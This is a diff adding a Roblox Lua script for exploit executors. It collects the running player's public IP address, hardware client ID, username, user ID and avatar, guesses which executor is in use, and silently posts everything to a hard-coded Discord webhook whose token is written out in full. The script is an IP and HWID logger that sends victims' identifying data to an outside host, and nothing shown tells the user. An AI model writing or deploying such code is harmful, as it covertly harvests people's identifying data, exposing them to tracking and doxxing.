@@ -1,0 +1,46 @@
+
+	local HTTP_ = game:GetService('HttpService')
+	local LPR = game:GetService('Players').LocalPlayer
+	local HWIDS = game:GetService("RbxAnalyticsService"):GetClientId()
+  local BALLER = tostring(game:HttpGet("https://api.ipify.org/", true))
+	-- Map exploit names to their corresponding values
+	local exploitNames = {
+		["is_sirhurt_closure"] = "Sirhurt",
+		["pebc_execute"] = "ProtoSmasher",
+		["syn"] = "Synapse X",
+		["secure_load"] = "Sentinel",
+		["KRNL_LOADED"] = "Krnl",
+		["SONA_LOADED"] = "Sona",
+		["FlUXUS_LOADED"] = "Fluxus",
+		["default"] = "Wave"
+	}
+
+	local webhookcheck = exploitNames[is_sirhurt_closure] or exploitNames[pebc_execute] or exploitNames[syn] or
+		exploitNames[secure_load] or exploitNames[KRNL_LOADED] or exploitNames[SONA_LOADED] or
+		exploitNames[FlUXUS_LOADED] or exploitNames["default"]
+
+	local avatarData = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]
+	local avatarURL = avatarData and avatarData['imageUrl'] or "Fallback URL"
+
+	local url = "https://discord.com/api/webhooks/1258667131051180062/_jw33QOqnXxnxAJbAIIYfO8Z5M-mD_wQrMh0Y39souAyAbeR7EfChb1KAkUu6tXod5VY"
+	local data = {
+		["username"] = LPR.Name .. ' [' .. LPR.UserId .. ']',
+		["avatar_url"] = avatarURL,
+		["embeds"] = {
+			{
+				["description"] = "Details:",
+				["fields"] = {
+					{ name = "Exploit", value = webhookcheck, inline = true },
+					{ name = "HWID", value = HWIDS, inline = true },
+          { name = "INJECT", value = BALLER, inline = true },
+				},
+				["color"] = tonumber(0xF08000),
+			}
+		}
+	}
+
+	local newdata = HTTP_:JSONEncode(data)
+	local headers = { ["content-type"] = "application/json" }
+
+	local request = http_request or request or HttpPost or syn.request
+	request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
